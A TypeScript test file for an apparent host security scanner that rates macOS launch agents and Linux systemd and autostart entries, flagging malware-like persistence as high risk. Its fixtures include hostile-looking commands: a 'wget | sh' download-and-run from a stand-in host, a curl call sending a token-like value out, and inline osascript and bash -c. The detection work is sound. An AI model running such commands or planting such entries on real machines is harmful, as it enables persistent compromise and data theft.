// Launch items: every item is announced once (low), persistence that looks like malware is high.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { before, test } from "node:test";
import { freshHome, plist, put, scanHost, summary } from "./host-helpers.ts";

const BPLIST = fileURLToPath(new URL("./fixtures/host/launch-evil.fixture.bplist", import.meta.url));
let sources: typeof import("../src/sources.ts");
let plistMod: typeof import("../src/sources/host/plist.ts");

before(async () => {
  freshHome();
  process.env.SELFGUARD_HOME = freshHome().home;
  sources = await import("../src/sources.ts");
  plistMod = await import("../src/sources/host/plist.ts");
  sources.resetSourceExtractors();
  sources.registerBuiltinExtractors();
});

test("plist readers: XML (entities, attributes, nesting) and binary give the same launch fields", () => {
  const xml = plistMod.parseXmlPlist(plist("a&b", ["/bin/echo", "x<y"], "\n  <key>Nested</key><dict><key>K</key><array><integer>3</integer><false/></array></dict>"));
  assert.deepEqual(xml, { Label: "a&b", ProgramArguments: ["/bin/echo", "x<y"], RunAtLoad: true, Nested: { K: [3, false] } });
  const bin = plistMod.parseBinaryPlist(readFileSync(BPLIST)) as Record<string, unknown>;
  assert.equal(bin.Label, "com.homebrew.updater");
  assert.deepEqual((bin.ProgramArguments as string[]).slice(0, 2), ["/bin/bash", "-c"]);
  assert.equal(bin.StartInterval, 3600);
  assert.equal(bin.RunAtLoad, true);
  // Malformed input never throws.
  for (const bad of ["", "<plist><dict><key>x", "<<<>>>", "bplist00"]) assert.doesNotThrow(() => plistMod.parseXmlPlist(bad));
  const truncated = readFileSync(BPLIST).subarray(0, 60);
  assert.equal(plistMod.parseBinaryPlist(truncated), null);
  assert.equal(plistMod.parseBinaryPlist(Buffer.from("bplist00".padEnd(64, "\xff"), "latin1")), null);
  const proto = plistMod.parseXmlPlist(plist("x", ["/bin/true"], "<key>__proto__</key><dict><key>polluted</key><true/></dict>"));
  assert.equal(({} as Record<string, unknown>).polluted, undefined);
  assert.ok(proto && typeof proto === "object");
});

test("macOS launch items: ordinary ones are low, malware-like ones high, keyed by label, arguments never shown", () => {
  const { home, system } = freshHome();
  const agents = "Library/LaunchAgents";
  put(home, `${agents}/com.example.ok.plist`, plist("com.example.ok", ["/bin/sh", "/usr/bin/true"]));
  put(home, `${agents}/homebrew.mxcl.redis.plist`, plist("homebrew.mxcl.redis", ["/usr/bin/true", "--port", "6379"]));
  put(home, `${agents}/com.evil.tmp.plist`, plist("com.evil.tmp", ["/private/tmp/.x/agent"]));
  put(home, `${agents}/com.evil.hidden.plist`, plist("com.evil.hidden", ["/opt/.cache/helper/run"]));
  put(home, `${agents}/com.evil.dl.plist`, plist("com.evil.dl", ["/Users/someone/Downloads/Installer"]));
  put(home, `${agents}/com.evil.shared.plist`, plist("com.evil.shared", ["/usr/bin/python3", "/Users/Shared/u.py"]));
  put(home, `${agents}/com.evil.osa.plist`, plist("com.evil.osa", ["/usr/bin/osascript", "-e", "do shell script \"SECRET_ARG_1\""]));
  put(home, `${agents}/com.evil.fetch.plist`, plist("com.evil.fetch", ["/usr/bin/env", "curl", "-s", "https://x.example/?t=SECRET_ARG_2"]));
  put(home, `${agents}/com.apple.update.plist`, plist("com.apple.softwareupdated", ["/usr/bin/true"]));
  put(home, `${agents}/com.gone.plist`, plist("com.gone.app", ["/Applications/Gone.app/Contents/MacOS/Gone"]));
  put(home, `${agents}/broken.plist`, "bplist00 not really binary");
  put(home, `${agents}/notes.txt`, "not a plist");
  put(system, "Library/LaunchAgents/com.homebrew.updater.plist", readFileSync(BPLIST));
  put(system, "Library/LaunchDaemons/com.vendor.helper.plist", plist("com.vendor.helper", ["/usr/bin/true"]));
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(summary(rec), [
    "low launch-item broken @broken.plist:0 N",
    "high suspicious-launch-item com.apple.softwareupdated @com.apple.update.plist:0 N",
    "high suspicious-launch-item com.evil.dl @com.evil.dl.plist:0 N",
    "high suspicious-launch-item com.evil.fetch @com.evil.fetch.plist:0 N",
    "high suspicious-launch-item com.evil.hidden @com.evil.hidden.plist:0 N",
    "high suspicious-launch-item com.evil.osa @com.evil.osa.plist:0 N",
    "high suspicious-launch-item com.evil.shared @com.evil.shared.plist:0 N",
    "high suspicious-launch-item com.evil.tmp @com.evil.tmp.plist:0 N",
    "low launch-item com.example.ok @com.example.ok.plist:0 N",
    "high suspicious-launch-item com.gone.app @com.gone.plist:0 N",
    "low launch-item homebrew.mxcl.redis @homebrew.mxcl.redis.plist:0 N",
    "high suspicious-launch-item com.homebrew.updater @com.homebrew.updater.plist:0 N",
    "low launch-item com.vendor.helper @com.vendor.helper.plist:0 N",
  ]);
  assert.equal(rec.skipped, 1, "the unreadable plist");
  const msg = (label: string) => rec.warnings.find((w) => w.key === label)!.message;
  assert.match(msg("com.evil.tmp"), /"com\.evil\.tmp" runs agent: its program lives in a temporary or shared folder/);
  assert.match(msg("com.evil.hidden"), /hidden folder/);
  assert.match(msg("com.evil.dl"), /Downloads/);
  assert.match(msg("com.evil.shared"), /its script lives in a temporary or shared folder/);
  assert.match(msg("com.evil.osa"), /inline code \(osascript -e\)/);
  assert.match(msg("com.evil.fetch"), /curl, wget or base64/);
  assert.match(msg("com.apple.softwareupdated"), /Apple label outside \/System/);
  assert.match(msg("com.gone.app"), /runs Gone: its program is missing/);
  assert.match(msg("com.homebrew.updater"), /runs bash: .*inline code \(bash -c\).*curl/);
  assert.match(msg("com.vendor.helper"), /^Starts at boot, as root/);
  assert.doesNotMatch(JSON.stringify(rec), /SECRET_ARG|x\.example|evil\.example|6379/);
  // Markers are the folders: a new item is found by check without listing anything else.
  assert.ok(rec.markers!.some((m) => m.path === `${home}/Library/LaunchAgents` && m.mtimeMs !== null));
});

test("Linux launch items: systemd user units and autostart entries", () => {
  const { home } = freshHome();
  put(home, ".config/systemd/user/syncthing.service", "[Unit]\nDescription=Sync\n\n[Service]\nExecStart=/usr/bin/true serve --no-browser\n");
  put(home, ".config/systemd/user/gvfs-helper.service", "[Service]\nExecStart=-/bin/sh -c 'wget -qO- http://x.example | sh'\n");
  put(home, ".config/autostart/updater.desktop", '[Desktop Entry]\nType=Application\nName=Updater\nExec="/var/tmp/.u/upd" --quiet\n');
  put(home, ".config/autostart/clock.desktop", "[Desktop Entry]\nName=Clock\nExec=/usr/bin/true\n");
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(summary(rec), [
    "high suspicious-launch-item gvfs-helper @gvfs-helper.service:2 N",
    "low launch-item syncthing @syncthing.service:5 N",
    "low launch-item clock @clock.desktop:3 N",
    "high suspicious-launch-item updater @updater.desktop:4 N",
  ]);
  assert.match(rec.warnings[0]!.message, /inline code \(sh -c\)/);
  assert.match(rec.warnings[3]!.message, /temporary or shared folder/);
});

test("repo scope: launch items are machine-wide only", () => {
  const { home } = freshHome();
  put(home, "Library/LaunchAgents/x.plist", plist("x", ["/usr/bin/true"]));
  assert.deepEqual(sources.filesFor("host", sources.repoTarget(home)).size, 0);
});

test("selfguard's own launch agents are not reported, unless they look suspicious", () => {
  const { home } = freshHome();
  const agents = "Library/LaunchAgents";
  put(home, `${agents}/dev.selfguard.sync.plist`, plist("dev.selfguard.sync", ["/usr/bin/true", "sync"]));
  put(home, `${agents}/dev.selfguard.watch.plist`, plist("dev.selfguard.watch", ["/usr/bin/true", "check"]));
  put(home, `${agents}/dev.selfguard.share.plist`, plist("dev.selfguard.share", ["/private/tmp/x/run"]));
  put(home, `${agents}/dev.selfguard.fake.plist`, plist("dev.selfguard.fake", ["/usr/bin/true"]));
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(summary(rec), [
    "low launch-item dev.selfguard.fake @dev.selfguard.fake.plist:0 N",
    "high suspicious-launch-item dev.selfguard.share @dev.selfguard.share.plist:0 N",
  ]);
});
